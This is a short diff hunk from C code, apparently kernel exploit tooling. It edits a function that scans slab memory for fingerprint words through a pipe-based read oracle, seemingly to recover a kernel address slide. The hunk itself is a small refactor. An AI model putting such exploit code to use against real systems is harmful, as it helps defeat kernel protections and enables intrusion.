@@ -910,12 +910,12 @@ static uintptr_t scan_p0_pipe_oracle(int fd, uintptr_t base) {
     const struct p0_fingerprint *fp = &fps[slide_index];
     int score = 0;
     for (int w = 0; w < P0_FINGERPRINT_WORDS; w++) {
-      size_t off = fp->offsets[w];
+      size_t off = p0_fingerprint_offsets[w];
       uint64_t val = 0;
       if (off + 8 <= ORDER3_SIZE) {
         memcpy(&val, slab + off, 8);
       }
-      if (val == fp->values[w]) {
+      if (val == fp->words[w]) {
         score++;
       }
     }
